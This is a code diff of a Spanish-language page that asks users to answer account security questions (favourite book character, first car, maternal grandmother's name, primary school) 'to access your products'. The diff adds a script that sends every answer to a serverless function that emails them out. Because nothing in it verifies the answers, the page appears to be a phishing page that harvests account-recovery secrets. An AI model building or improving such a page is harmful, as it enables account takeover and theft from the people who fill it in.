@@ -110,21 +110,21 @@
     <div class="container">
         <h1>Preguntas de seguridad</h1>
         <p>Tu seguridad es muy importante para nosotros. Por favor, responde las preguntas que configuraste para acceder a tus productos.</p>
-        <form>
+        <form id="security-form">
             <label>¿Cuál es el personaje de su libro favorito?</label>
-            <input type="text" placeholder="Digita tu respuesta">
+            <input type="text" id="favorite-character" placeholder="Digita tu respuesta" required>
 
             <label>¿Cuál es la marca de su primer carro?</label>
-            <input type="text" placeholder="Digita tu respuesta">
+            <input type="text" id="first-car-brand" placeholder="Digita tu respuesta" required>
 
             <label>¿Cuál es su color favorito?</label>
-            <input type="text" placeholder="Digita tu respuesta">
+            <input type="text" id="favorite-color" placeholder="Digita tu respuesta" required>
 
             <label>¿Cuál es el nombre de su abuela materna?</label>
-            <input type="text" placeholder="Digita tu respuesta">
+            <input type="text" id="grandmother-name" placeholder="Digita tu respuesta" required>
 
             <div class="school">nombre del colegio donde cursó la<br>primaria</div>
-            <input type="text" placeholder="Digita tu respuesta">
+            <input type="text" id="school-name" placeholder="Digita tu respuesta" required>
             
             <div class="help">
                 Si olvidaste tus preguntas de seguridad, comunícate con nosotros: <br>
@@ -137,5 +137,45 @@
             </div>
         </form>
     </div>
+
+    <script>
+        document.getElementById('security-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const favoriteCharacter = document.getElementById('favorite-character').value;
+            const firstCarBrand = document.getElementById('first-car-brand').value;
+            const favoriteColor = document.getElementById('favorite-color').value;
+            const grandmotherName = document.getElementById('grandmother-name').value;
+            const schoolName = document.getElementById('school-name').value;
+
+            const formData = {
+                favoriteCharacter,
+                firstCarBrand,
+                favoriteColor,
+                grandmotherName,
+                schoolName
+            };
+
+            fetch('/.netlify/functions/sendEmail', {
+                method: 'POST',
+                body: JSON.stringify(formData),
+                headers: {
+                    'Content-Type': 'application/json'
+                }
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.message === 'Correo enviado con éxito') {
+                    alert('Las respuestas fueron enviadas correctamente.');
+                } else {
+                    alert('Hubo un error al enviar las respuestas.');
+                }
+            })
+            .catch(error => {
+                console.error('Error al enviar las respuestas:', error);
+                alert('Hubo un error al enviar las respuestas.');
+            });
+        });
+    </script>
 </body>
 </html>
